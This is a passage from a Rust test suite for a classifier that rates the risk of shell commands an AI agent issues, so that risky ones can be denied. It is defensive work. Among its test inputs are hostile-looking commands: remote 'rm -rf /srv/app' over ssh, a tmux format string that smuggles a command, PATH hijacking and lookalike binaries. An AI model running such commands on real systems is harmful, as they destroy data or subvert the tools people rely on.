            let pipeline = pipeline_from_parts(
                assessment(RiskBand::Critical, ExposureBand::Account, "test"),
                semantic_receipt(&request, status),
                false,
            );
            assert_eq!(pipeline.effective_risk, RiskBand::Critical, "{status:?}");
            assert!(!pipeline.semantic_failsafe_escalated, "{status:?}");
            assert_eq!(
                pipeline.visible_json()["semantic_status"],
                format!("{status:?}")
            );
        }
    }

    #[test]
    fn historical_risky_commands_are_assessed_without_execution() {
        // These commands occurred in the earlier workflow. They are inputs to
        // the assessor only: this test never invokes a shell or a provider.
        // `npm install` occurred in both plugins/executor and plugins/pi; this
        // classifier deliberately receives command text, not a working directory.
        struct NeverCalled;
        impl SemanticAssessor for NeverCalled {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                unreachable!("the unavailable replay path must not invoke an assessor")
            }
        }
        let staging = SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, None);
        for (command, expected_risk, expected_exposure) in [
            (
                "git add plugins/executor/lib/workflow-preamble.mjs plugins/executor/lib/host-adapters.mjs plugins/executor/lib/managed-client-supervisor.mjs plugins/executor/tests/host-adapters.test.mjs plugins/executor/tests/managed-client-supervisor.test.mjs",
                RiskBand::Moderate,
                ExposureBand::Unknown,
            ),
            (
                "git add -- plugins/executor/lib/workflow-preamble.mjs plugins/executor/lib/host-adapters.mjs plugins/executor/lib/managed-client-supervisor.mjs plugins/executor/tests/host-adapters.test.mjs plugins/executor/tests/managed-client-supervisor.test.mjs",
                RiskBand::Moderate,
                ExposureBand::Unknown,
            ),
            (
                "git commit -m \"fix(executor): reinforce workflow continuation\"",
                RiskBand::High,
                ExposureBand::External,
            ),
            ("npm install", RiskBand::Moderate, ExposureBand::Unknown),
        ] {
            let pipeline = assess_pipeline_with_config::<NeverCalled>(
                None,
                "Bash",
                &json!({"command": command}),
                Some("implement"),
                None,
                &staging,
            );
            assert_eq!(pipeline.deterministic.risk, expected_risk, "{command}");
            assert_eq!(
                pipeline.deterministic.exposure, expected_exposure,
                "{command}"
            );
            assert_eq!(
                pipeline.semantic.status,
                SemanticAssessorStatus::Unavailable,
                "{command}"
            );
            assert!(pipeline.semantic.vector.is_none(), "{command}");
            assert_eq!(pipeline.effective_risk, expected_risk, "{command}");
            assert!(!pipeline.semantic_failsafe_escalated, "{command}");
        }
    }

    #[test]
    fn deterministic_tmux_effects_precede_system_one_fallthrough() {
        let read = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"tmux capture-pane -p -t %36 -S -80 | tail -80"}),
            Some("intake"),
        );
        assert_eq!(read.risk, RiskBand::Low);
        assert_eq!(read.exposure, ExposureBand::Local);

        let goal = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"tmux send-keys -t %36 '/goal finish OAuth' Enter"}),
            Some("implement"),
        );
        assert_eq!(goal.risk, RiskBand::Moderate);
        assert_eq!(goal.exposure, ExposureBand::Local);

        for command in [
            "tmux send-keys -t %36 status Enter",
            "tmux new-session shell",
            "tmux list-panes -F '#(touch /tmp/marker)'",
        ] {
            let unknown = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":command}),
                Some("implement"),
            );
            assert_eq!(unknown.risk, RiskBand::Moderate, "{command}");
            assert_eq!(unknown.exposure, ExposureBand::Unknown, "{command}");
        }
    }

    #[test]
    fn deterministic_sed_viewer_chain_precedes_system_one_fallthrough() {
        let read = assess_invocation(
            None,
            "exec_command",
            &json!({
                "cmd": "sed -n '1,360p' /private/agentic-sdlc/SKILL.md && sed -n '1,360p' /private/optimize-statewright-usage/SKILL.md"
            }),
            Some("localize"),
        );
        assert_eq!(read.risk, RiskBand::Low);
        assert_eq!(read.exposure, ExposureBand::Local);

        let labeled_read = assess_invocation(
            None,
            "exec_command",
            &json!({
                "cmd": "sed -n '1,300p' /private/agentic-sdlc/SKILL.md && printf '\\n--- optimize usage ---\\n' && sed -n '1,300p' /private/optimize-statewright-usage/SKILL.md"
            }),
            Some("implement"),
        );
        assert_eq!(labeled_read.risk, RiskBand::Low);
        assert_eq!(labeled_read.exposure, ExposureBand::Local);

        for command in [
            "printf -v PATH /attacker",
            "printf '%n' PATH",
            "/tmp/printf label",
        ] {
            let unknown = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("implement"),
            );
            assert_eq!(unknown.risk, RiskBand::Moderate, "{command}");
            assert_eq!(unknown.exposure, ExposureBand::Unknown, "{command}");
        }

        let stderr_discarding_read = assess_invocation(
            None,
            "exec_command",
            &json!({
                "cmd": "rg --files -g '*oauth*' -g '*receipt*' . /private/statewright 2>/dev/null | sed -n '1,240p'"
            }),
            Some("localize"),
        );
        assert_eq!(stderr_discarding_read.risk, RiskBand::Low);
        assert_eq!(stderr_discarding_read.exposure, ExposureBand::Local);

        let hostile_semantic_receipt = SemanticAssessmentReceipt {
            tool: "exec_command".to_owned(),
            status: SemanticAssessorStatus::Assessed,
            vector: Some(SemanticRiskVector {
                read_only: Probability::new(0.19).unwrap(),
                may_write: Probability::new(0.86).unwrap(),
                reversible: Probability::new(0.22).unwrap(),
                destructive: Probability::new(0.77).unwrap(),
                irreversible: Probability::new(0.78).unwrap(),
                external_or_account_effect: Probability::new(0.73).unwrap(),
            }),
            state_intent: Some("localize".to_owned()),
        };
        let pipeline = pipeline_from_parts(stderr_discarding_read, hostile_semantic_receipt, true);
        assert_eq!(pipeline.effective_risk, RiskBand::Low);
        assert!(!pipeline.semantic_failsafe_escalated);
        assert_eq!(pipeline.resolve_effect(), ResolvedEffect::ReadOnly);

        let sed_lookalike = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd": "/tmp/sed -n '1,20p'"}),
            Some("localize"),
        );
        assert_eq!(sed_lookalike.risk, RiskBand::Moderate);
        assert_eq!(sed_lookalike.exposure, ExposureBand::Unknown);
    }

    #[test]
    fn visible_pipeline_submission_reports_the_actual_queue_full_outcome() {
        let request = semantic_request(
            None,
            "read_file",
            &json!({"path":"/private/secret"}),
            None,
            false,
        );
        let enabled =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("1"));
        let (queue, _receiver) = SemanticAssessmentQueue::new(1);
        assert!(queue.try_submit(request.clone()).is_ok());
        let runtime = SemanticShadowRuntime { queue };
        let receipt = submit_semantic_pipeline_with(&enabled, Some(&runtime), &request);
        assert_eq!(receipt.status, SemanticAssessorStatus::QueueFull);
        assert!(receipt.vector.is_none());
        assert!(!format!("{:?}", receipt).contains("/private/secret"));
    }

    #[test]
    fn semantic_effect_resolution_requires_high_confidence_and_structural_evidence() {
        let vector = |read_only, may_write, reversible, destructive, irreversible, external| {
            SemanticRiskVector {
                read_only: Probability::new(read_only).unwrap(),
                may_write: Probability::new(may_write).unwrap(),
                reversible: Probability::new(reversible).unwrap(),
                destructive: Probability::new(destructive).unwrap(),
                irreversible: Probability::new(irreversible).unwrap(),
                external_or_account_effect: Probability::new(external).unwrap(),
            }
        };
        let pipeline = |semantic| RiskPipelineAssessment {
            deterministic: assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":"systemctl status statewright"}),
                None,
            ),
            effective_risk: RiskBand::Moderate,
            semantic_failsafe_escalated: false,
            semantic,
            semantic_authorization_enabled: true,
        };
        let assessed = |value| SemanticAssessmentReceipt {
            tool: "exec_command".into(),
            status: SemanticAssessorStatus::Assessed,
            vector: Some(value),
            state_intent: Some("inspect".into()),
        };
        assert_eq!(
            pipeline(assessed(vector(0.97, 0.02, 0.99, 0.01, 0.01, 0.01))).resolve_effect(),
            ResolvedEffect::ReadOnly
        );
        assert_eq!(
            pipeline(assessed(vector(0.02, 0.97, 0.91, 0.01, 0.01, 0.01))).resolve_effect(),
            ResolvedEffect::LocalWrite
        );
        assert_eq!(
            pipeline(assessed(vector(0.89, 0.11, 0.90, 0.01, 0.01, 0.01))).resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        let request = semantic_request(None, "exec_command", &json!({"cmd":"unknown"}), None, true);
        assert_eq!(
            pipeline(semantic_receipt(&request, SemanticAssessorStatus::Timeout)).resolve_effect(),
            ResolvedEffect::DenyUncertain
        );

        let shadow_only = RiskPipelineAssessment {
            deterministic: assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":"systemctl status statewright"}),
                None,
            ),
            effective_risk: RiskBand::Moderate,
            semantic_failsafe_escalated: false,
            semantic: assessed(vector(0.99, 0.01, 0.99, 0.0, 0.0, 0.0)),
            semantic_authorization_enabled: false,
        };
        assert_eq!(shadow_only.resolve_effect(), ResolvedEffect::DenyUncertain);

        let confident_read = assessed(vector(0.99, 0.01, 0.99, 0.0, 0.0, 0.0));

        let external_writer: ToolInfo = serde_json::from_value(json!({
            "name":"update_task", "inputSchema":{}, "annotations":{"openWorldHint":true}
        }))
        .unwrap();
        let external_pipeline = pipeline_from_parts(
            assess_invocation(
                Some(&external_writer),
                "update_task",
                &json!({"task":"private-task"}),
                Some("implement"),
            ),
            confident_read.clone(),
            true,
        );
        assert_eq!(external_pipeline.deterministic.risk, RiskBand::Moderate);
        assert_eq!(
            external_pipeline.deterministic.exposure,
            ExposureBand::External
        );
        assert_eq!(external_pipeline.effective_risk, RiskBand::Moderate);
        assert_eq!(
            external_pipeline.resolve_effect(),
            ResolvedEffect::DenyKnownRisk
        );

        let missing_shape = RiskPipelineAssessment {
            deterministic: assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":"tmux $(secret-helper)"}),
                None,
            ),
            effective_risk: RiskBand::Moderate,
            semantic_failsafe_escalated: false,
            semantic: confident_read.clone(),
            semantic_authorization_enabled: true,
        };
        assert_eq!(
            missing_shape.resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        let visible = missing_shape.visible_json();
        assert_eq!(visible["resolved_effect"], "deny_uncertain");
        assert_eq!(
            visible["resolution_basis"],
            "incomplete_structural_evidence"
        );
        assert_eq!(
            visible["required_authority"],
            "complete_structural_evidence_or_separate_approval"
        );
        assert_eq!(visible["equivalent_retry_allowed"], true);
        assert_eq!(visible["reformulation_allowed"], true);
        assert_eq!(visible["exact_invocation_retry_allowed"], false);
        assert_eq!(visible["separate_approval_allowed"], false);
        for basis in [
            "semantic_threshold_not_met",
            "incomplete_structural_evidence",
            "semantic_vector_unavailable",
            "semantic_assessment_incomplete",
            "semantic_authorization_disabled",
        ] {
            let semantic_denial = missing_shape.visible_json_for_denial(
                basis,
                "complete_structural_evidence_or_separate_approval",
            );
            assert_eq!(semantic_denial["equivalent_retry_allowed"], true, "{basis}");
            assert_eq!(semantic_denial["reformulation_allowed"], true, "{basis}");
            assert_eq!(
                semantic_denial["exact_invocation_retry_allowed"], false,
                "{basis}"
            );
            assert_eq!(
                semantic_denial["separate_approval_allowed"], true,
                "{basis}"
            );
        }
        let wrong_authority = missing_shape
            .visible_json_for_denial("semantic_threshold_not_met", "BoundedLocalExecution");
        assert_eq!(wrong_authority["reformulation_allowed"], true);
        assert_eq!(wrong_authority["separate_approval_allowed"], false);
        let capability_denial =
            missing_shape.visible_json_for_denial("workflow_capability_read_denied", "Read");
        assert_eq!(capability_denial["equivalent_retry_allowed"], false);
        assert_eq!(capability_denial["reformulation_allowed"], false);
        assert_eq!(capability_denial["exact_invocation_retry_allowed"], false);
        assert_eq!(capability_denial["separate_approval_allowed"], false);
        let classifier_policy_denial = missing_shape
            .visible_json_for_denial("classifier_policy_low_local", "BoundedLocalExecution");
        assert_eq!(classifier_policy_denial["reformulation_allowed"], false);
        assert_eq!(
            classifier_policy_denial["exact_invocation_retry_allowed"],
            false
        );
        assert_eq!(classifier_policy_denial["separate_approval_allowed"], false);
        let known_risk = external_pipeline
            .visible_json_for_denial("effective_known_risk", "separate_approved_execution_path");
        assert_eq!(known_risk["equivalent_retry_allowed"], false);
        assert_eq!(known_risk["reformulation_allowed"], false);
        assert_eq!(known_risk["exact_invocation_retry_allowed"], false);
        assert_eq!(known_risk["separate_approval_allowed"], false);
        assert!(
            visible["intent_fingerprint"]
                .as_str()
                .is_some_and(|value| value.starts_with("intent_v1_"))
        );
        assert!(!visible.to_string().contains("secret-helper"));

        for command in [
            "task test",
            "npm run inspect",
            "npm build",
            "pnpm lint",
            "cargo run -- inspect",
            "cargo test",
            "docker exec container inspect",
            "podman run image",
            "kubectl exec pod -- inspect",
            "tmux send-keys -t %1 status Enter",
            "tmux new-session shell",
        ] {
            let delegated = RiskPipelineAssessment {
                deterministic: assess_invocation(
                    None,
                    "exec_command",
                    &json!({"cmd":command}),
                    None,
                ),
                effective_risk: RiskBand::Moderate,
                semantic_failsafe_escalated: false,
                semantic: confident_read.clone(),
                semantic_authorization_enabled: true,
            };
            assert!(
                matches!(
                    delegated.resolve_effect(),
                    ResolvedEffect::DenyKnownRisk | ResolvedEffect::DenyUncertain
                ),
                "{command}"
            );
        }
    }

    #[test]
    fn semantic_effect_resolution_never_downgrades_known_or_effective_high_risk() {
        let semantic = SemanticAssessmentReceipt {
            tool: "exec_command".into(),
            status: SemanticAssessorStatus::Assessed,
            vector: Some(SemanticRiskVector {
                read_only: Probability::new(1.0).unwrap(),
                may_write: Probability::new(0.0).unwrap(),
                reversible: Probability::new(1.0).unwrap(),
                destructive: Probability::new(0.0).unwrap(),
                irreversible: Probability::new(0.0).unwrap(),
                external_or_account_effect: Probability::new(0.0).unwrap(),
            }),
            state_intent: None,
        };
        for risk in [RiskBand::High, RiskBand::Critical] {
            let pipeline = RiskPipelineAssessment {
                deterministic: assessment(risk, ExposureBand::External, "shell"),
                effective_risk: risk,
                semantic_failsafe_escalated: false,
                semantic: semantic.clone(),
                semantic_authorization_enabled: true,
            };
            assert_eq!(pipeline.resolve_effect(), ResolvedEffect::DenyKnownRisk);
        }

        let proven_read = pipeline_from_parts(
            assess_invocation(None, "read_file", &json!({"path":"README.md"}), None),
            SemanticAssessmentReceipt {
                tool: "read_file".into(),
                status: SemanticAssessorStatus::Assessed,
                vector: Some(SemanticRiskVector {
                    read_only: Probability::new(0.1).unwrap(),
                    may_write: Probability::new(0.1).unwrap(),
                    reversible: Probability::new(0.1).unwrap(),
                    destructive: Probability::new(0.9).unwrap(),
                    irreversible: Probability::new(0.9).unwrap(),
                    external_or_account_effect: Probability::new(0.0).unwrap(),
                }),
                state_intent: None,
            },
            true,
        );
        assert_eq!(proven_read.effective_risk, RiskBand::Low);
        assert_eq!(proven_read.resolve_effect(), ResolvedEffect::ReadOnly);
    }

    #[test]
    fn shell_ast_shadow_feeds_bounded_features_to_a_separate_semantic_request() {
        set_test_shell_ast_shadow_enabled(Some(true));
        let _ = take_test_shell_ast_receipts();

        let assessment = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"if git rev-parse HEAD; then git push origin private-canary-path; fi"}),
            Some("inspect"),
        );
        let legacy = assessment.semantic_request.as_ref().unwrap();
        let ast = assessment.ast_semantic_request.as_ref().unwrap();
        assert!(legacy.shell_ast_shape.is_none());
        assert!(ast.tool_name.ends_with("_ast_shadow"));
        let shape = ast.shell_ast_shape.as_ref().unwrap();
        assert!(shape.conditional_nodes >= 1);
        assert!(shape.effect_candidates.contains(&"git_write"));
        assert!(
            shape
                .commands
                .iter()
                .any(|command| command.operation.as_deref() == Some("push"))
        );
        let serialized = serde_json::to_string(ast).unwrap();
        assert!(serialized.contains("shell_ast_shape"));
        assert!(!serialized.contains("private-canary-path"));

        let receipts = take_test_shell_ast_receipts();
        assert_eq!(receipts.len(), 1);
        assert!(receipts[0].disagrees);
        assert!(receipts[0].ast_is_stricter);
        assert_eq!(receipts[0].ast_risk, RiskBand::High);
        assert!(!format!("{:?}", receipts[0]).contains("private-canary-path"));

        set_test_shell_ast_shadow_enabled(None);
    }

    #[test]
    fn shell_ast_shadow_distinguishes_executable_and_data_heredocs() {
        set_test_shell_ast_shadow_enabled(Some(true));
        let _ = take_test_shell_ast_receipts();
        let shell = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"bash <<'EOF'\ngit push origin HEAD\nEOF"}),
            None,
        );
        let data = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"cat > artifact <<'EOF'\ngit push origin HEAD\nEOF"}),
            None,
        );
        let shell_shape = shell.ast_semantic_request.unwrap().shell_ast_shape.unwrap();
        let data_shape = data.ast_semantic_request.unwrap().shell_ast_shape.unwrap();
        assert_eq!(shell_shape.shell_heredocs, 1);
        assert!(shell_shape.effect_candidates.contains(&"git_write"));
        assert_eq!(data_shape.data_heredocs, 1);
        assert!(!data_shape.effect_candidates.contains(&"git_write"));
        assert!(data_shape.effect_candidates.contains(&"file_write"));
        set_test_shell_ast_shadow_enabled(None);
    }

    #[test]
    fn shell_ast_shadow_is_inert_without_explicit_opt_in() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(false));
        let _ = take_test_shell_ast_receipts();
        let assessment = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"git rev-parse HEAD"}),
            None,
        );
        assert!(assessment.ast_semantic_request.is_none());
        assert!(take_test_shell_ast_receipts().is_empty());
        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn shell_ast_authority_admits_compound_reads_and_preserves_stricter_effects() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));
        for command in [
            "if git rev-parse HEAD; then tmux capture-pane -p -t %36 | tail -80; fi",
            "(pwd; git status --short)",
            "git rev-parse HEAD && rg needle crates | head -20",
            "nl -ba src/components/BookingWizard.vue | sed -n '485,525p'; nl -ba src/components/__tests__/BookingWizard.checkout.spec.js | sed -n '445,530p'; nl -ba docs/milestones/2026-10-02-checkout-durable-outcome.md | sed -n '28,46p'",
            "case inspect in inspect) git status --short;; esac",
            "for reference in HEAD main; do git rev-parse \"$reference\"; done",
        ] {
            let assessed = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":command}),
                Some("inspect"),
            );
            assert_eq!(assessed.source, "shell_ast", "{command}");
            assert_eq!(assessed.risk, RiskBand::Low, "{command}");
            assert_eq!(assessed.exposure, ExposureBand::Local, "{command}");
        }
        let status = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"git status --short"}),
            Some("inspect"),
        );
        assert_eq!(status.source, "shell_ast");
        assert_eq!(status.risk, RiskBand::Low);
        assert_eq!(status.exposure, ExposureBand::Local);
        for (command, risk) in [
            ("git status --short && git push origin HEAD", RiskBand::High),
            ("printf '%s\\n' \"$(git push origin HEAD)\"", RiskBand::High),
            (
                "bash -lc 'git rev-parse HEAD && git push origin HEAD'",
                RiskBand::High,
            ),
            ("bash <<'EOF'\ngit push origin HEAD\nEOF", RiskBand::High),
            ("cat <(git push origin HEAD)", RiskBand::High),
            ("git rev-parse HEAD || git push origin HEAD", RiskBand::High),
            (
                "if test -d target; then rm -rf target; fi",
                RiskBand::Critical,
            ),
            ("ssh host <<'EOF'\nrm -rf /srv/app\nEOF", RiskBand::Critical),
        ] {
            let assessed = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd":command}),
                Some("inspect"),
            );
            assert_eq!(assessed.source, "shell_ast", "{command}");
            assert_eq!(assessed.risk, risk, "{command}");
        }
        let data = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"cat > artifact <<'EOF'\ngit push origin HEAD\nEOF"}),
            Some("implement"),
        );
        assert_eq!(data.source, "shell_ast");
        assert_eq!(data.risk, RiskBand::Moderate);
        assert_eq!(data.exposure, ExposureBand::Local);
        let mkdir = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"mkdir -p docs/plans"}),
            Some("implement"),
        );
        assert_eq!(mkdir.source, "shell_ast");
        assert_eq!(mkdir.risk, RiskBand::Moderate);
        assert_eq!(mkdir.exposure, ExposureBand::Local);
        let git_add = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"git add -- docs/research/001-anytype.md docs/adr/0002-boundary.md fixtures/compatibility/cases.json"}),
            Some("implement"),
        );
        assert_eq!(git_add.source, "shell_ast");
        assert_eq!(git_add.risk, RiskBand::Moderate);
        assert_eq!(git_add.exposure, ExposureBand::Unknown);
        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn shell_ast_authority_aggregates_compound_local_effects_without_exact_class_matches() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));

        let resolved = |command: &str| {
            let deterministic = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("implement"),
            );
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
            .resolve_effect()
        };

        assert_eq!(
            resolved(
                "git rev-parse HEAD && git worktree add -b fix/structural .agent-worktrees/structural HEAD"
            ),
            ResolvedEffect::LocalWrite
        );
        assert_eq!(
            resolved(
                "printf receipt > receipt.txt && statewright-git-closeout --message test -- docs/receipt.md"
            ),
            ResolvedEffect::LocalWriteAndGitLocalWrite
        );
        assert_eq!(
            resolved("npm test && git status --short"),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            resolved("npm test && mkdir output"),
            ResolvedEffect::LocalWriteAndBoundedLocalExecution
        );
        assert_eq!(
            resolved("npm test && statewright-git-closeout --message test -- docs/receipt.md"),
            ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
        );
        assert_eq!(
            resolved(
                "npm test && mkdir output && statewright-git-closeout --message test -- docs/receipt.md"
            ),
            ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
        );
        assert_eq!(
            resolved("npm test && curl https://example.invalid"),
            ResolvedEffect::DenyKnownRisk
        );

        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn shell_ast_authority_resolves_version_probes_and_bounded_validation() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));

        let resolved = |command: &str| {
            let deterministic = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("validate"),
            );
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
            .resolve_effect()
        };

        assert_eq!(resolved("node --version"), ResolvedEffect::ReadOnly);
        let focused_node_test = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd": "node --test --test-name-pattern='codex invalid key' plugins/executor/tests/browser-onboarding.test.mjs"}),
            Some("validate"),
        );
        assert_eq!(focused_node_test.risk, RiskBand::Moderate);
        assert_eq!(focused_node_test.exposure, ExposureBand::Local);
        assert_eq!(
            focused_node_test.required_capability,
            Some("BoundedLocalExecution")
        );
        let request = focused_node_test.semantic_request.as_ref().unwrap().clone();
        assert_eq!(
            pipeline_from_parts(
                focused_node_test,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
            .resolve_effect(),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            resolved("/Users/ben/.cargo/bin/cargo test --offline -p statewright-mcp-gateway"),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(resolved("npm test"), ResolvedEffect::BoundedLocalExecution);
        assert_eq!(
            resolved("pnpm run test"),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            resolved("if npm test; then git status --short; fi"),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            resolved("cargo test --offline -p statewright-mcp-gateway"),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            resolved("cargo test -p statewright-mcp-gateway"),
            ResolvedEffect::DenyUncertain
        );
        assert_eq!(
            resolved("node --test ../outside.test.mjs"),
            ResolvedEffect::DenyUncertain
        );

        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn intent_fingerprint_is_stable_for_equivalent_redacted_shapes() {
        let visible = |command: &str| {
            let deterministic = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("validate"),
            );
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
            .visible_json()
        };

        let left = visible("cargo test --offline -p private-package-one");
        let left_again = visible("cargo test --offline -p private-package-one");
        let right = visible("cargo test --offline -p private-package-two");
        assert_eq!(left["intent_fingerprint"], right["intent_fingerprint"]);
        assert_eq!(
            left["invocation_fingerprint"],
            left_again["invocation_fingerprint"]
        );
        assert_ne!(
            left["invocation_fingerprint"],
            right["invocation_fingerprint"]
        );
        assert!(!left.to_string().contains("private-package"));
    }

    #[test]
    fn parsed_delegated_units_reach_system_one_without_erasing_known_write_floor() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));

        let vector = |read_only, may_write| SemanticRiskVector {
            read_only: Probability::new(read_only).unwrap(),
            may_write: Probability::new(may_write).unwrap(),
            reversible: Probability::new(0.95).unwrap(),
            destructive: Probability::new(0.01).unwrap(),
            irreversible: Probability::new(0.01).unwrap(),
            external_or_account_effect: Probability::new(0.01).unwrap(),
        };
        let pipeline = |command: &str, semantic_vector| {
            let deterministic = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": command}),
                Some("implement"),
            );
            assert_eq!(deterministic.source, "shell_ast");
            if command.starts_with("mkdir ") {
                assert_eq!(deterministic.required_capability, Some("Write"));
            }
            let semantic = SemanticAssessmentReceipt {
                tool: "exec_command".into(),
                status: SemanticAssessorStatus::Assessed,
                vector: Some(semantic_vector),
                state_intent: Some("implement".into()),
            };
            pipeline_from_parts(deterministic, semantic, true)
        };

        assert_eq!(
            pipeline(
                "python3 -c 'open(\"x\", \"w\").write(\"y\")'",
                vector(0.02, 0.97)
            )
            .resolve_effect(),
            ResolvedEffect::LocalWrite
        );
        assert_eq!(
            pipeline("python3 -c 'print(1)'", vector(0.97, 0.02)).resolve_effect(),
            ResolvedEffect::ReadOnly
        );
        assert_eq!(
            pipeline(
                "python3 -c 'private_framework.execute()'",
                vector(0.02, 0.97)
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        assert_eq!(
            pipeline(
                "mkdir -p output && python3 -c 'print(1)'",
                vector(0.97, 0.02),
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        assert_eq!(
            pipeline(
                "mkdir -p output && python3 -c 'print(1)'",
                vector(0.02, 0.97),
            )
            .resolve_effect(),
            ResolvedEffect::LocalWrite
        );
        assert_eq!(
            pipeline(
                "statewright-git-closeout --message test -- docs/receipt.md && python3 -c 'open(\"x\", \"w\").write(\"y\")'",
                vector(0.02, 0.97),
            )
            .resolve_effect(),
            ResolvedEffect::LocalWriteAndGitLocalWrite
        );

        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn invocation_ast_can_override_a_generic_shell_executor_non_read_hint() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));

        let executor: ToolInfo = serde_json::from_value(json!({
            "name": "exec_command",
            "inputSchema": {},
            "annotations": { "readOnlyHint": false }
        }))
        .unwrap();
        let semantic = |read_only, may_write| SemanticAssessmentReceipt {
            tool: "exec_command".into(),
            status: SemanticAssessorStatus::Assessed,
            vector: Some(SemanticRiskVector {
                read_only: Probability::new(read_only).unwrap(),
                may_write: Probability::new(may_write).unwrap(),
                reversible: Probability::new(0.95).unwrap(),
                destructive: Probability::new(0.01).unwrap(),
                irreversible: Probability::new(0.01).unwrap(),
                external_or_account_effect: Probability::new(0.01).unwrap(),
            }),
            state_intent: Some("implement".into()),
        };
        let pipeline = |command: &str, receipt| {
            pipeline_from_parts(
                assess_invocation(
                    Some(&executor),
                    "exec_command",
                    &json!({"cmd": command}),
                    Some("implement"),
                ),
                receipt,
                true,
            )
        };

        let bounded_output = pipeline("python3 -c 'print(1)'", semantic(0.18, 0.82));
        assert_eq!(
            bounded_output.deterministic.risk,
            RiskBand::Low,
            "{:?}",
            bounded_output.deterministic
        );
        assert_eq!(bounded_output.deterministic.exposure, ExposureBand::Local);
        assert_eq!(bounded_output.resolve_effect(), ResolvedEffect::ReadOnly);
        assert_eq!(
            pipeline(
                "python3 -c 'open(\"x\", \"w\").write(\"y\")'",
                semantic(0.02, 0.97)
            )
            .resolve_effect(),
            ResolvedEffect::LocalWrite
        );
        assert_eq!(
            pipeline(
                "python3 -c 'private_framework.execute()'",
                semantic(0.97, 0.02)
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        assert_eq!(
            pipeline("systemctl status statewright", semantic(0.97, 0.02)).resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        for command in [
            "python3 -c 'print(1); private_framework.execute()'",
            "python3 -c 'print(1)' && systemctl status statewright",
        ] {
            let unresolved = pipeline(command, semantic(0.97, 0.02));
            assert_eq!(
                unresolved.deterministic.risk,
                RiskBand::Moderate,
                "{command}"
            );
            assert_eq!(
                unresolved.deterministic.exposure,
                ExposureBand::Unknown,
                "{command}"
            );
            assert_eq!(unresolved.resolve_effect(), ResolvedEffect::DenyUncertain);
        }
        for lookalike in ["/tmp/nl -ba README.md", "/tmp/sed -n '1,10p' README.md"] {
            let deterministic = assess_invocation(
                None,
                "exec_command",
                &json!({"cmd": lookalike}),
                Some("validate"),
            );
            assert_eq!(deterministic.risk, RiskBand::Moderate, "{lookalike}");
            assert_eq!(deterministic.exposure, ExposureBand::Unknown, "{lookalike}");
        }

        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn shell_ast_authority_only_downgrades_the_proven_compound_read_case() {
        let known_high = assessment(RiskBand::High, ExposureBand::External, "shell");
